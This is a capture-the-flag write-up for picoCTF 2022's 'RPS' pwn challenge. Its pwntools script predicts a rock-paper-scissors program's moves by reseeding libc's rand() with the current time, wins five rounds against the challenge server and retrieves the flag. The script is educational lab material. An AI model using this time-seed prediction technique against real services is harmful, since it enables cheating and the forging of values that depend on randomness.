---
name: RPS (2022)
event: Pico CTF 2022
category: Pwn
description: Writeup for RPS (Pwn) - Pico CTF (2022) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# RPS

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/dAsujQ_OPEk/0.jpg)](https://youtu.be/dAsujQ_OPEk?t=196 "Pico CTF 2022: RPS")

## Description

> Here's a program that plays rock, paper, scissors against you. I hear something good happens if you win 5 times in a row.

## Solution

{% code overflow="wrap" %}
```py
from pwn import *
from time import time
from ctypes import CDLL

io = remote('saturn.picoctf.net', 53865)
context.log_level = 'debug'

libc = CDLL('/lib/x86_64-linux-gnu/libc.so.6')

for i in range(5):
    io.recvuntil(b'program')
    io.sendline(b'1')

    sleep(1)  # Compensate for client-server

    libc.srand(int(time()))  # Call srand() with current time as seed
    computer_turn = libc.rand() % 3  # Predict computers turn

    # Computer players hand
    hands = ["rock", "paper", "scissors"]
    # Calculate winning move
    if hands[computer_turn] == 'rock':
        payload = b'paper'
    elif hands[computer_turn] == 'paper':
        payload = b'scissors'
    elif hands[computer_turn] == 'scissors':
        payload = b'rock'

    # Submit turn
    io.recvuntil(b':')
    io.sendline(payload)

io.interactive()  # Flag
```
{% endcode %}
